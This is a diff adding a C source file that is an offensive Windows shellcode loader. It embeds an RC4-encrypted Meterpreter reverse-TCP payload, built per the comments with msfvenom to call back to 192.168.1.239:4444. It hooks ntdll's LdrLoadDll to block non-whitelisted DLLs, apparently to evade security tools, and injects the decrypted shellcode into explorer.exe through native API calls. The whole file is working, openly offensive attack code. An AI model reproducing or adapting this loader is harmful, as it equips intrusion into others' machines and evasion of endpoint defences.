@@ -1,0 +1,280 @@
+#include <stdio.h>
+#include <windows.h>
+#include <wincrypt.h>
+#include <tlhelp32.h>
+#include <ntdef.h>
+#include <winternl.h>
+
+#include "main.h"
+
+/****************************************************************************************************/
+// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin
+// cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin
+// xxd -i encmeter.bin
+unsigned char encmeter_bin[] = {
+  0x6e, 0xdc, 0x5b, 0x2a, 0x59, 0xba, 0x87, 0x64, 0x3e, 0x1d, 0x15, 0xcc,
+  0x55, 0x5e, 0x70, 0xdd, 0xf3, 0x57, 0x98, 0x96, 0x2a, 0xd0, 0x0f, 0xe5,
+  0x5a, 0xcd, 0xab, 0x28, 0xb3, 0xda, 0xff, 0x70, 0xd5, 0x48, 0x25, 0x7f,
+  0xaf, 0x87, 0x0b, 0xd4, 0xd5, 0x89, 0x44, 0xa8, 0x47, 0xc1, 0x0d, 0xce,
+  0x17, 0xf3, 0x64, 0x72, 0x70, 0xd4, 0xd8, 0x5f, 0xfe, 0x66, 0xe1, 0x20,
+  0x21, 0x89, 0x43, 0xf2, 0xd9, 0x95, 0x17, 0x4e, 0x96, 0xe7, 0x9a, 0xab,
+  0xa8, 0x14, 0xc9, 0x85, 0x4c, 0x23, 0x5d, 0x8a, 0x24, 0xef, 0x5e, 0x3b,
+  0xe7, 0x14, 0x74, 0x65, 0x6a, 0x20, 0xe2, 0x03, 0x89, 0x84, 0xfa, 0x9d,
+  0xf1, 0x97, 0x46, 0xc9, 0x50, 0xc1, 0x07, 0xf6, 0x49, 0xd1, 0x2d, 0x35,
+  0x45, 0x66, 0x06, 0xf7, 0x49, 0x9b, 0xc8, 0x0b, 0x0e, 0xc1, 0x3b, 0x71,
+  0x7c, 0xef, 0xbe, 0x94, 0xd5, 0x81, 0xbe, 0x5f, 0x81, 0x6c, 0x7f, 0x18,
+  0x1e, 0xd7, 0x3f, 0x93, 0x0f, 0x7e, 0x09, 0x2f, 0x53, 0x6c, 0x04, 0x34,
+  0x77, 0x61, 0x54, 0x56, 0x8f, 0x43, 0xd7, 0x5b, 0xc3, 0x29, 0x1e, 0x16,
+  0xda, 0xf3, 0x58, 0x83, 0x8c, 0xd7, 0xf2, 0x3d, 0x4c, 0xb4, 0x3d, 0xcb,
+  0x24, 0xfa, 0x84, 0x00, 0x58, 0x28, 0x96, 0xe0, 0x1b, 0x57, 0x03, 0x2e,
+  0xc6, 0xc5, 0x22, 0x31, 0xc1, 0x1d, 0xe4, 0xd5, 0x8a, 0x4c, 0x79, 0x5f,
+  0x83, 0x05, 0xe3, 0x73, 0x8c, 0x11, 0x9e, 0x57, 0xcf, 0x5f, 0xa9, 0x7b,
+  0x26, 0xfa, 0xc3, 0xad, 0xd1, 0x2c, 0x57, 0x32, 0xbe, 0x3a, 0x41, 0x18,
+  0x55, 0x87, 0x74, 0xc0, 0xbf, 0x26, 0xd8, 0x01, 0xf0, 0x15, 0xdd, 0x2b,
+  0xe6, 0x35, 0x7a, 0xcc, 0x18, 0x83, 0xf4, 0xdd, 0xc9, 0x75, 0x68, 0x12,
+  0x6d, 0x19, 0x10, 0x2b, 0xb6, 0x89, 0x20, 0x35, 0xd4, 0x81, 0x36, 0xe2,
+  0x4d, 0xf0, 0xfb, 0x1d, 0x0f, 0xfa, 0xb6, 0x9e, 0x74, 0x2d, 0x51, 0x33,
+  0x79, 0xa8, 0xc1, 0xda, 0x55, 0x14, 0x87, 0x44, 0xc2, 0x19, 0x28, 0x28,
+  0x8a, 0xe9, 0x24, 0x01, 0x99, 0xae, 0xa4, 0xa1, 0xdf, 0xb1, 0xcf, 0x87,
+  0x54, 0x93, 0x51, 0xcc, 0xb7, 0x02, 0x4c, 0x2e, 0xeb, 0xdc, 0x7c, 0x72,
+  0xbe, 0x4b, 0x2c, 0xaa, 0x34, 0x44, 0x6f, 0xbb, 0xc5, 0x79, 0x20, 0xb9,
+  0x67, 0x52, 0x1e, 0x28, 0x71, 0x40, 0x72, 0xa6, 0x5b, 0x4f, 0xa0, 0xc2,
+  0x1e, 0x2e, 0x6f, 0x48, 0x16, 0x1a, 0x3a, 0xfd, 0xb5, 0x9b, 0x84, 0x3c,
+  0x9c, 0x4c, 0x61, 0x63, 0xe0, 0x34, 0x57, 0x24, 0xab, 0x6c, 0x3e, 0xb3,
+  0x8a, 0x02, 0x74, 0x59, 0x27, 0x20, 0x0f, 0xd5, 0x8e, 0x1e, 0x5c, 0x43,
+  0x61, 0xf0, 0x4d, 0x5b, 0xb3, 0x00, 0xea, 0x18, 0xb2, 0xef, 0x43, 0x94,
+  0xd8, 0x5d, 0x5d, 0x4b, 0xc6, 0xd9, 0xed, 0x2f, 0xca, 0xed, 0xe1, 0x79,
+  0x0c, 0xa1, 0x46, 0x77, 0x78, 0x15, 0x87, 0x9d, 0xea, 0x9e, 0xa6, 0x8b,
+  0x10, 0x29, 0x49, 0x28, 0xca, 0xc1, 0x07, 0x19, 0x9b, 0x54, 0xb2, 0x1b,
+  0xd2, 0x9b, 0xbc, 0x7d, 0x9c, 0x14, 0x97, 0x43, 0x7b, 0x33, 0x41, 0xd3,
+  0x26, 0x7f, 0xe9, 0xf1, 0xbf, 0xfb, 0xd8, 0xc5, 0x96, 0x19, 0x5e, 0x65,
+  0xa3, 0xb1, 0x18, 0x44, 0x16, 0xc1, 0x63, 0x72, 0xc8, 0x53, 0xa5, 0x74,
+  0xee, 0x2c, 0x7c, 0xe2, 0x0f, 0xe4, 0x11, 0x91, 0x4d, 0xe3, 0xa4, 0xa6,
+  0xd9, 0xf0, 0x59, 0x97, 0xbb, 0x86, 0x1e, 0xc4, 0x68, 0x64, 0x4b, 0x45,
+  0x00, 0xf0, 0x78, 0xac, 0x98, 0x21, 0xfe, 0xd3, 0xdd, 0xe8, 0xa3, 0xca,
+  0x0d, 0x77, 0xb8, 0xab, 0x7c, 0xe2, 0x64, 0x26, 0x37, 0x76, 0x85, 0x92,
+  0x91, 0x2e, 0x62, 0x25, 0x6b, 0x3e, 0xd5, 0xf2, 0xf0, 0x9a, 0xda, 0xc3,
+  0x60, 0x90, 0xca, 0x00, 0x04, 0x19
+};
+unsigned int encmeter_bin_len = 510;
+/****************************************************************************************************/
+
+NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID *BaseAddress)
+{
+    INT i;
+    DWORD dwOldProtect;
+    BOOL bAllow = FALSE;
+    DWORD dwbytesWritten;
+    CHAR cDllName[MAX_PATH];
+
+    // change to a char
+    sprintf(cDllName, "%S", DllName->Buffer);
+
+    for (i = 0; i < dwAllowDllCount; i++)
+    {
+        // is it on the whitelist
+        if (strcmp(cDllName, cAllowDlls[i]) == 0)
+        {
+            bAllow = TRUE;
+
+            printf("Allowing DLL: %s\n", cDllName);
+
+            // repatch LdrLoadDll and call it
+            VirtualProtect(lpAddr, sizeof(OriginalBytes), PAGE_EXECUTE_READWRITE, &dwOldProtect);
+            memcpy(lpAddr, OriginalBytes, sizeof(OriginalBytes));
+            VirtualProtect(lpAddr, sizeof(OriginalBytes), dwOldProtect, &dwOldProtect);
+
+            LdrLoadDll_ LdrLoadDll = (LdrLoadDll_)GetProcAddress(LoadLibrary("ntdll.dll"), "LdrLoadDll");
+
+            LdrLoadDll(SearchPath, DllCharacteristics, DllName, BaseAddress);
+
+            // then hook it again
+            HookLoadDll(lpAddr);
+        }
+
+    }
+
+    if (!bAllow)
+    {
+        printf("Blocked DLL: %s\n", cDllName);
+    }
+
+    return TRUE;
+}
+
+VOID HookLoadDll(LPVOID lpAddr)
+{
+    DWORD oldProtect, oldOldProtect;
+    void *hLdrLoadDll = &_LdrLoadDll;
+
+    // our trampoline
+    unsigned char boing[] = { 0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3 };
+
+    // add in the address of our hook
+    *(void **)(boing + 2) = &_LdrLoadDll;
+
+    // write the hook
+    VirtualProtect(lpAddr, 13, PAGE_EXECUTE_READWRITE, &oldProtect);
+    memcpy(lpAddr, boing, sizeof(boing));
+    VirtualProtect(lpAddr, 13, oldProtect, &oldProtect);
+
+    return;
+}
+
+BOOL DecryptShellcode()
+{
+    BOOL bSuccess = TRUE;
+
+    HCRYPTKEY hCryptoKey;
+    HCRYPTHASH hCryptHash;
+    HCRYPTPROV hCryptoProv;
+
+    BYTE* pbKey = "HideMyShellzPlz?";
+    DWORD dwLen = strlen(pbKey);
+
+    // get the crypto context
+    bSuccess = fnCryptAcquireContextW(&hCryptoProv, NULL, L"Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
+    if (!bSuccess)
+    {
+        printf("CryptAcquireContextW\n");
+        goto CLEANUP;
+    }
+
+    // init an create the hashing handle
+    bSuccess = fnCryptCreateHash(hCryptoProv, CALG_SHA_256, 0, 0, &hCryptHash);
+    if (!bSuccess)
+    {
+        printf("CryptCreateHash\n");
+        goto CLEANUP;
+    }
+
+    // add the key to the hash object
+    bSuccess = fnCryptHashData(hCryptHash, pbKey, dwLen, 0);
+    if (!bSuccess)
+    {
+        printf("CryptHashData\n");
+        goto CLEANUP;
+    }
+
+    // gen the session keys from the hash
+    bSuccess = fnCryptDeriveKey(hCryptoProv, CALG_RC4, hCryptHash, 0,&hCryptoKey);
+    if (!bSuccess)
+    {
+        printf("CryptDeriveKey\n");
+        goto CLEANUP;
+    }
+
+    // decrypt the buffer
+    bSuccess = fnCryptDecrypt(hCryptoKey, NULL, FALSE, 0, (BYTE*)encmeter_bin, &encmeter_bin_len);
+    if (!bSuccess)
+    {
+        printf("CryptDecrypt: %d\n", GetLastError());
+        goto CLEANUP;
+    }
+
+    goto CLEANUP;
+
+    CLEANUP:
+        fnCryptReleaseContext(hCryptoProv, 0);
+        fnCryptDestroyKey(hCryptoKey);
+        fnCryptDestroyHash(hCryptHash);
+
+        return bSuccess;
+}
+
+DWORD FindExplorer()
+{
+    PROCESSENTRY32 pe32 = {0};
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    // take snapshot
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if(hSnapshot)
+    {
+        // enum the processes found
+        if(Process32First(hSnapshot, &pe32))
+        {
+            do
+            {
+                // check if its explorer, if it is then give the pid
+                if (strcmp(pe32.szExeFile, "explorer.exe") == 0)
+                {
+                    return pe32.th32ProcessID;
+                }
+            } while(Process32Next(hSnapshot, &pe32));
+            CloseHandle(hSnapshot);
+        }
+    }
+
+    return -1;
+}
+
+int main(int argc,  char const *argv[])
+{
+    DWORD dwPid;
+    INITIAL_TEB InitTeb;
+    LPVOID lpBuffer = NULL;
+    CLIENT_ID uPid = { 0 };
+    HANDLE hThread, hProcess;
+    OBJECT_ATTRIBUTES ObjectAttributes;
+
+    // crypto stuff
+    fnCryptAcquireContextW = (CryptAcquireContextW_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptAcquireContextW");
+    fnCryptCreateHash = (CryptCreateHash_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptCreateHash");
+    fnCryptHashData = (CryptHashData_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptHashData");
+    fnCryptDeriveKey = (CryptDeriveKey_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDeriveKey");
+    fnCryptDecrypt = (CryptDecrypt_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDecrypt");
+    fnCryptReleaseContext = (CryptReleaseContext_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptReleaseContext");
+    fnCryptDestroyKey = (CryptDestroyKey_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDestroyKey");
+    fnCryptDestroyHash = (CryptDestroyHash_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDestroyHash");
+
+    // decrypt the shellcode
+    if (!DecryptShellcode())
+    {
+        printf("[!] Failed to decrypt shellcode\n");
+        return -1;
+    }
+
+    // get addresss of where the hook should be
+    lpAddr = (LPVOID)GetProcAddress(GetModuleHandle("ntdll.dll"), "LdrLoadDll");
+
+    // save the original bytes
+    memcpy(OriginalBytes, lpAddr, 13);
+
+    // set the hook
+    HookLoadDll(lpAddr);
+
+    // find the pid of explorer.exe
+    dwPid = FindExplorer();
+    if (dwPid == -1)
+    {
+        printf("[!] Failed to find process\n");
+        return -1;
+    }
+
+    // set the pid to get a handle to
+    uPid.UniqueProcess = (HANDLE)dwPid;
+    uPid.UniqueThread = NULL;
+
+    // get a handle on the process
+    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
+    NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &uPid);
+
+    // alloc memory
+    NtAllocateVirtualMemory(hProcess, &lpBuffer, 0, &encmeter_bin_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    // write the shellcode to the process
+    NtWriteVirtualMemory(hProcess, lpBuffer, encmeter_bin, encmeter_bin_len, NULL);
+
+    // start the shellcode
+    NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, FALSE, NULL, NULL, NULL, NULL);
+    if (hThread == INVALID_HANDLE_VALUE)
+    {
+        printf("[!] Failed to inject shellcode\n");
+        return -1;
+    }
+
+    printf("[+] Successfully injected shellcode\n");
+
+    return 0;
+}
